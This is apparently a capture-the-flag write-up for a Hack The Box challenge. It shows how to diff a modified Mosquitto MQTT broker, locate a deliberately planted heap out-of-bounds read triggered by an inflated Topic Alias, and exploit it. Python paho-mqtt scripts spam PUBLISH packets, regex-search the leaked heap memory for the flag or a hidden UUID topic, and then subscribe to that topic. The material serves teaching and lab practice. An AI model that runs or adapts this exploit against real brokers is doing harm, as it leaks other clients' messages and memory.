![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /><font size='10'>
The Unverified Patch
</font>

7<sup>th</sup> Mar 2026

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis

- Binary diffing a modified `mosquitto` broker against the open-source release to identify custom patches.
- Understanding MQTT v5 features, specifically how memory is allocated for "Topic Aliases".
- Identifying a heap Out-of-Bounds (OOB) read vulnerability introduced by the custom patch.
- Weaponizing the OOB read to repeatedly dump heap memory to extract the randomized UUID topic of a retained flag message.

## Description

- Post-attack, NECC engineers rushed a pending Mosquitto enhancement live. They didn’t have enough time to secure the new implementation. Task Force Nightfall: it’s on you to check the update ASAP. Audit the broker before the election window closes.

## Skills Required (!)

- Binary Patch Diffing (Ghidra, BinDiff).
- Understanding of the MQTT protocol (Topic Aliases).
- Heap memory exploitation and Out-of-Bounds (OOB) Reads.

# Solution (!)

## Step 1: Understanding the Environment

We are provided with a directory containing `flag_planter.py`, `make.sh`, `mosquitto`, and `mosquitto.conf`. The core component here is the `mosquitto` binary, which acts as our target.

Let's inspect the configuration file (`mosquitto.conf`):

```conf
listener 1883 0.0.0.0

allow_anonymous true

# MQTT v5 topic alias support
max_topic_alias 256

# Logging
log_type all
log_dest stderr

persistence false
```

From this configuration, we can determine two key things:
1.  **Anonymous Access is Allowed**: `allow_anonymous true` means we can connect to the broker without providing valid credentials.
2.  **Topic Aliases are Enabled**: The setting `max_topic_alias 256` indicates that the broker supports MQTT v5 Topic Aliases, with a maximum value of 256.

Before diving in, let's briefly review some MQTT basics.

### What is MQTT?

MQTT (Message Queuing Telemetry Transport) is a lightweight, publish-subscribe network protocol designed for transporting messages between devices. It is heavily used in the Internet of Things (IoT) because of its small footprint and efficiency in low-bandwidth, high-latency environments. 

The architecture consists of two primary components:
- **Broker**: The central hub (in our case, `mosquitto`) that receives all messages, filters them, and routes them to the correct subscribed clients.
- **Client**: Devices or applications that connect to the broker to either **publish** messages or **subscribe** to receive them.

### Publishing to Topics

In MQTT, data is organized into **topics**. A topic is essentially a structured string (like a file path) that the broker uses to route messages. 
- When a client wants to send data, it **publishes** a message to a specific topic (e.g., `sensors/temp/room1`). 
- When a client wants to receive data, it **subscribes** to a topic. The broker automatically forwards any messages published on that topic to all clients subscribed to it.

### What is a Topic Alias?

Introduced in MQTT v5, a **Topic Alias** is an optimization feature to reduce network bandwidth. Topic names, especially long semantic ones (like `home/living_room/temperature/sensor_1`), consume bytes every time a message is published.

To mitigate this, a client can substitute a long topic string with a small integer value—the **Topic Alias**.
1.  The client sends a `PUBLISH` message containing both the full topic string and a Topic Alias ID (e.g., `Alias=1`).
2.  The broker records this mapping: `1 -> home/living_room/temperature/sensor_1`.
3.  In all subsequent `PUBLISH` messages to that same topic, the client omits the long topic string entirely and only sends the Topic Alias ID (`Alias=1`).

The broker uses the previously saved mapping to know where to route the new message. In our configuration, the broker accepts alias IDs up to `256`.

## Reviewing make.sh

Next, we have the `make.sh` file, which contains the build commands:

```bash
make clean && make WITH_EDITLINE=no WITH_CJSON=no WITH_HTTP_API=no WITH_SQLITE=no WITH_DOCS=no
```

This tells us exactly how the `mosquitto` broker was compiled. This information will be incredibly helpful later when we need to download the original open-source broker source code and diff it against this version to identify what modifications or vulnerabilities have been artificially patched in.

## Analyzing the Flag Planter

Finally, we have `flag_planter.py`, which connects to the `mosquitto` broker and publishes the flag as a **retained** message to a random topic. A retained message means the broker will store this message and immediately send it to any new clients that subscribe to its topic. Because the topic is a random UUID, we can't simply guess it to subscribe and retrieve the flag; we have to find a way to leak it from the broker's memory or intercept it.

## Step 2: Identifying the Target Version

To understand what we are dealing with, we need to determine the exact version of the `mosquitto` broker provided in the challenge. We can do this by simply running the binary with the `--version` flag:

```bash
./mosquitto --version
mosquitto 2.0.23
Copyright © 2025 Roger Light.
License EPL-2.0 OR BSD-3-Clause.
```

This reveals that the broker is running Mosquitto version `2.0.23`. 

At the time of writing this writeup, version `2.0.23` was not tagged as a release yet in the official repositories. Therefore, simply downloading a release tarball won't work. We need to clone the official Git repository and find the specific commit where the version was bumped to `2.0.23` on the `master` branch.

That commit hash is `a2ad289e337e7848a86f2982af596e08a0df3861`. Let's clone the repository and check it out:

```bash
git clone https://github.com/eclipse-mosquitto/mosquitto.git
cd mosquitto
git checkout a2ad289e337e7848a86f2982af596e08a0df3861
```

With the source code checked out to the correct commit, we can now compile the broker using the exact same flags provided in the challenge's `make.sh` file:

```bash
make clean && make WITH_EDITLINE=no WITH_CJSON=no WITH_HTTP_API=no WITH_SQLITE=no WITH_DOCS=no
```

Once built, we will enter the `src` directory and verify that we have successfully compiled version `2.0.23`:

```bash
cd src
./mosquitto --version
mosquitto 2.0.23
Copyright © 2025 Roger Light.
License EPL-2.0 OR BSD-3-Clause.
```

## Step 3: Diffing the Binary

Now that we possess the original, freshly compiled broker alongside the provided challenge binary, we need to compare them to see exactly what vulnerabilities the challenge author introduced.

To accomplish this, we will use **Ghidra** combined with the **BinExport** plugin to extract the function signatures and graphs. Then, we will use **BinDiff** to compare the `.BinExport` outputs of both binaries.

**In Ghidra:**
1. Import both the original compiled broker and the challenge `mosquitto` binary.
2. Analyze both of them using the default auto-analysis settings.
3. For each binary, go to **File > Export Program**.
4. Set the **Format** drop-down to **Binary BinExport (v2) for BinDiff**
5. Ensure the file extension is `.BinExport` and click **OK**.

**In BinDiff:**
1. Open BinDiff and create a new workspace/project.
2. Create a new Diff.
3. Select your original compiled broker's `.BinExport` file as the Primary, and the challenge's `.BinExport` file as the Secondary (or vice versa).
4. Run the diffing process.

By analyzing the BinDiff results, we can quickly identify the functions that differ between the original code and the patched challenge binary.

Once BinDiff finishes its analysis, navigate to the **Matched Functions** tab in your workspace. This view lists all functions that exist in both binaries. 

By sorting or filtering using the **Similarity** column, we can easily spot the modified functions. Any function with a similarity score less than `1.00` (100%) has been altered. 

In this case, only two functions differ from the original 2.0.23.
1. `handle__subscribe`
2. `handle__publish`

Now that we have successfully narrowed down the scope of the challenge to these two functions, let's jump back into Ghidra and decompile them to see exactly what changed.

### Analyzing handle__subscribe

By placing the decompiled output of `handle__subscribe` side-by-side with the original source, the modification becomes obvious almost immediately after the `mosquitto_acl_check` call.

**Original:**
```c
iVar1 = mosquitto_acl_check(context,sub,0,(void *)0x0,qos,false,4);
if (iVar1 == 0) {
  iVar1 = sub__add(context,sub,qos,subscription_identifier,(uint)subscription_options);
  // ...
```

**Patched:**
```c
iVar2 = mosquitto_acl_check(context,sub,0,(void *)0x0,qos,false,4);
uVar7 = (byte)*sub - 0x23; // 0x23 is '#'
if (uVar7 == 0) {
  uVar7 = (uint)(byte)sub[1];
}
if (uVar7 == 0) {
LAB_00118508:
  if (context->protocol == mosq_p_mqtt5) {
    qos = 0x87;
  }
  else if (context->protocol == mosq_p_mqtt311) {
    qos = 0x80;
  }
}
else {
  if (iVar2 != 0) {
    // ...
  }
  iVar2 = sub__add(context,sub,qos,subscription_identifier,(uint)subscription_options);
  // ...
```

The patched broker introduces an explicit check on the subscription topic string (`sub`). 
1. It reads the first byte of the requested topic and subtracts `0x23` (the ASCII hex value for `#`).
2. If the first byte is `#`, it checks if the second byte is a null terminator (`0`).
3. If the topic requested is exactly `"#"` (the MQTT multi-level wildcard), it bypasses the `sub__add` registration completely. Instead, it forcefully returns a failed QoS response (`0x87` or `0x80`).

### The `#` Wildcard
In MQTT, subscribing to the `"#"` topic acts as a multi-level wildcard, meaning the broker will send you every single message published across all topics on the server. 

Because of this patch, we can no longer simply subscribe to `"#"` to dump all the retained messages. Interestingly, this behavior could have been easily achieved using standard ACL (Access Control List) configurations provided by Mosquitto natively. 

Patching this restriction directly into the handle__subscribe` function binary code instead serves as a **rabbit hole** designed to increase the binary differences shown in our diffing tools and trick us into sinking time into analyzing the `handle__subscribe` function, looking for a vulnerability that isn't there!


### Analyzing handle__publish

Looking closely at `handle__publish` in Ghidra, we immediately spot a juicy **Heap Over-Read** memory vulnerability.

Let's break down where the bug happens and what changed:

#### 1. Messing with the Payload Length (`store->payloadlen`)
*   **Original Code:** Normally, Mosquitto calculates the payload size simply from what's remaining in the packet.
```c
uVar8 = (context->in_packet).remaining_length - (context->in_packet).pos;
// ...
store->payloadlen = uVar8; 
```
*   **The Patch:** They take the actual payload length and then **add** the MQTT **Topic Alias** value to it. 
```c
uVar22 = (context->in_packet).remaining_length - (context->in_packet).pos; // Real length
// ...
uVar8 = local_88 + uVar22; // ocal_88 is our Topic Alias!
if ((int)local_88 < 1) {
  uVar8 = uVar22;
}
// ...
store->payloadlen = uVar8; // Now payloadlen is artificially inflated
```

#### 2. Heap Allocation (`mosquitto__malloc`)
*   **Original Code:** The original code allocates memory using `store->payloadlen`. Since it matches the data size, this is safe.
```c
pvVar16 = mosquitto__malloc((ulong)(uVar8 + 1)); // uVar8 is payloadlen
```
*   **The Patch:** But instead of using the fake `payloadlen`, the patched broker allocates memory based *only* on the **actual payload size** (`uVar22`). 
```c
pvVar15 = mosquitto__malloc((ulong)(uVar22 + 1)); // uVar22 is the real length
```

#### 3. Reading the Data (`packet__read_bytes`)
*   **Original Code:** Reads `store->payloadlen` bytes into the buffer.
```c
iVar9 = packet__read_bytes(packet,store->payload,store->payloadlen);
```
*   **The Patch:** Finally, it reads only `uVar22` (the real length) bytes into the buffer. This is important because it means the initial network read from our client won't crash the broker.
```c
iVar9 = packet__read_bytes(packet,store->payload,uVar22);
```

### So, what's the exploit?

If we connect to the broker, send an MQTT v5 PUBLISH packet, and set a huge **Topic Alias** property (let's say `Alias = 250`), here's what the broker does:
1. It allocates a heap chunk that perfectly fits our payload's *real* size.
2. It reads our payload safely into that chunk.
3. It lies to its internal message store and saves `payloadlen = Actual Payload Size + 250`.

Later, when Mosquitto forwards this published message to a subscribed client, it completely trusts `store->payloadlen`. It tries to read `Actual_Size + 250` bytes from the heap buffer we just filled. Because the chunk is actually smaller than that, the broker ends up reading past the end of the buffer!

This gives us an **OOB (Out-of-Bounds) Read**, leaking `250` bytes of adjacent heap memory right back to us. We can use this to leak the topics names, pointers, or anything else sitting nearby in the heap.

## Step 4: Exploitation

To exploit this, our basic strategy will be:
1. Use `mosquitto_sub` to subscribe to a topic we control to catch the OOB data. Let's call it `leak`.
2. Write a Python script to connect and publish a message repeatedly to the `leak` topic, explicitly setting a large Topic Alias. (We can't just use `mosquitto_pub` directly for this, as it doesn't give us the low-level control to send an arbitrary Topic Alias value).

Because of the patch in `handle__publish`, every time the broker forwards our published message back to our subscriber, it will append chunks of the broker's current heap memory to our payload!

Let's write a simple Python script using the `paho-mqtt` library to trigger the vulnerability:

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

BROKER_HOST = "localhost"
BROKER_PORT = 1883
TOPIC       = "leak"
MESSAGE     = "leak detected"
TOPIC_ALIAS = 250

client = mqtt.Client(protocol=mqtt.MQTTv5)
client.connect(BROKER_HOST, BROKER_PORT)

props = Properties(PacketTypes.PUBLISH)
props.TopicAlias = TOPIC_ALIAS

client.publish(TOPIC, MESSAGE, qos=1, properties=props)
print(f"Published '{MESSAGE}' to '{TOPIC}' with Topic Alias {TOPIC_ALIAS}")

client.disconnect()
```

To see the exploit in action, we first start a subscriber listening to the `leak` topic:

```bash
mosquitto_sub -h localhost -p 1883 -t leak
```

Then, we run our Python script to trigger the OOB read!
```text
leak detected!leak1ba�Q�d�l�d!`��l�d1��l�d	0q�
```

It works! We can clearly see random bytes of Mosquitto's heap memory appended right after our `leak detected!` string. 

### Leaking the Flag

Now we have confirmed a working memory leak. How do we turn this into the flag?
We know from analyzing `flag_planter.py` that the flag is published as a **retained** message to a completely random UUID topic string (e.g., `87f62e84-8806-444e-a1fb-60afba0100f9`).

A retained message is held in the broker's memory indefinitely. This means the random UUID topic string itself *must* be sitting somewhere on the broker's heap right now! 

If we modify our Python exploit to repeatedly send the malicious Topic Alias payload and save the leaked heap data, we can just regex search the memory dumps. 

This gives us two distinct paths to victory:
1. **Direct Leak:** We get lucky and the flag string (`HTB{...}`) itself happens to be part of the leaked 250 bytes of heap memory.
2. **Topic Leak:** We find the completely random UUID topic string. Once we have the precise topic name, retrieving the flag is trivial: we simply use `mosquitto_sub` to subscribe to that leaked UUID topic, and the broker will immediately hand us the retained flag message!

We can build a final automated Python exploit script that implements both of these paths, continuously looping and hunting through the memory dumps until the flag is captured.

First, we define our regex to match either the flag format directly or the UUID format of the hidden topic:

```python
# Regexes for our two victory paths
FLAG_REGEX = re.compile(rb"HTB\{.*?\}")
UUID_REGEX = re.compile(rb"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
```

Next, we handle the incoming MQTT messages in our `on_message` callback. This function will parse the payload for both of those regexes. If the UUID is found, it will automatically subscribe to the hidden topic!

```python
def on_message(client, userdata, msg):
    global found_flag, leaked_topic
    if found_flag: return

    # 1. Did we get the retained message or a direct flag leak?
    flag_match = FLAG_REGEX.search(msg.payload)
    if flag_match:
        print(f"\n[+] SUCCESS! Flag obtained: {flag_match.group(0).decode()}")
        found_flag = True
        return

    # 2. Did we leak the flag's UUID topic?
    if not leaked_topic:
        uuid_match = UUID_REGEX.search(msg.payload)
        if uuid_match:
            leaked_topic = uuid_match.group(0).decode()
            print(f"\n[+] SUCCESS! UUID Topic Leaked from heap: {leaked_topic}")
            print(f"[*] Subscribing to '{leaked_topic}' to retrieve the retained flag...")
            client.subscribe(leaked_topic)
            return
```

Finally, we set up our MQTT v5 client, connect to the broker, and repeatedly publish our malicious payload with an artificially inflated Topic Alias to generate the memory leaks:

```python
# ... Client setup and connection omitted ...

props = Properties(PacketTypes.PUBLISH)
props.TopicAlias = TOPIC_ALIAS # Set this to a large value like 250!

print("[*] Triggering Heap OOB Read...")
for i in range(100):
    if found_flag:
        break
    
    # Publish with oversized Topic Alias to trigger OOB read on subscriber side
    client.publish(LEAK_TOPIC, MESSAGE, qos=1, properties=props)
    time.sleep(0.05)

# ... Loop stop and disconnect omitted ...
```
